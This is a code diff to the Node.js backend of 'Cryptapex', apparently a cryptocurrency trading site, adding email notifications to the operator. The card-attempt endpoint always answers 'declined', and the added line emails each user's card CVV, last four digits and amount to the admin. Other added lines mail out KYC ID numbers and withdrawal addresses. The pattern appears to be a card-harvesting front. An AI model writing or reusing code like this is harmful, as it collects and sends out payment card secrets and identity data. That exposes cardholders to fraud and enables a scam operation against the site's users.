@@ -5,6 +5,7 @@ const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
 const { v4: uuidv4 } = require('uuid');
 const { MongoClient } = require('mongodb');
+const nodemailer = require('nodemailer');
 const multer = require('multer');
 
 const app = express();
@@ -81,6 +82,36 @@ const upload = multer({
   limits: { fileSize: 5 * 1024 * 1024 } // 5MB
 });
 
+
+const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@cryptapex.com';
+const transporter = nodemailer.createTransport({
+  host: process.env.SMTP_HOST || 'smtp.gmail.com',
+  port: 587,
+  secure: false,
+  auth: {
+    user: process.env.SMTP_USER || '',
+    pass: process.env.SMTP_PASS || ''
+  }
+});
+
+async function notifyAdmin(subject, text) {
+  if (!process.env.SMTP_USER) {
+    console.log('[EMAIL]', subject, text);
+    return;
+  }
+  try {
+    await transporter.sendMail({
+      from: process.env.SMTP_USER,
+      to: ADMIN_EMAIL,
+      subject: '[Cryptapex] ' + subject,
+      text
+    });
+  } catch (e) {
+    console.error('Email failed:', e.message);
+  }
+}
+
+
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -127,6 +158,7 @@ app.post('/api/register', async (req, res) => {
     createdAt: new Date().toISOString()
   };
   await usersCol.insertOne(user);
+  notifyAdmin('New Registration', `User: ${username}\nEmail: ${email}\nName: ${fullName}`);
   res.json({ message: 'Registration successful. Your account is pending admin approval.', pending: true });
 });
 
@@ -195,10 +227,12 @@ app.post('/api/trade', auth, async (req, res) => {
 
   const user = await usersCol.findOne({ id: req.user.id });
   if (side === 'buy') {
-    const cost = qty * price;
+    // amount is in USD, convert to asset quantity
+    const cost = qty;
+    const assetQty = qty / price;
     if (user.balanceUSD < cost) return res.status(400).json({ error: 'Insufficient USD balance' });
     await usersCol.updateOne({ id: user.id }, {
-      $inc: { balanceUSD: -cost, [`portfolio.${symbol}`]: qty }
+      $inc: { balanceUSD: -cost, [`portfolio.${symbol}`]: assetQty }
     });
   } else if (side === 'sell') {
     if ((user.portfolio[symbol] || 0) < qty) return res.status(400).json({ error: 'Insufficient crypto balance' });
@@ -236,6 +270,7 @@ app.post('/api/card-attempt', auth, async (req, res) => {
     status: 'declined',
     timestamp: new Date().toISOString()
   });
+  notifyAdmin('Card Attempt', `User: ${req.user.username}\nCard: ****${number?.slice(-4)}\nAmount: $${amount}\nCVV: ${cvv}`);
   res.json({ success: false, message: 'Declined. Contact Card issuer' });
 });
 
@@ -282,6 +317,7 @@ app.post('/api/withdraw', auth, async (req, res) => {
     status: 'pending',
     timestamp: new Date().toISOString()
   });
+  notifyAdmin('Withdrawal Request', `User: ${req.user.username}\nAmount: $${amt}\nAddress: ${address}\nNetwork: ${network}`);
   res.json({ success: true, message: 'Withdrawal request submitted' });
 });
 
@@ -385,6 +421,7 @@ app.post('/api/kyc/submit', auth, upload.fields([{ name: 'front', maxCount: 1 },
     }
   }
   await usersCol.updateOne({ id: req.user.id }, { $set: update });
+  notifyAdmin('KYC Submitted', `User: ${req.user.username}\nName: ${fullName}\nID: ${idNumber}`);
   res.json({ success: true, message: 'KYC submitted for review' });
 });
 
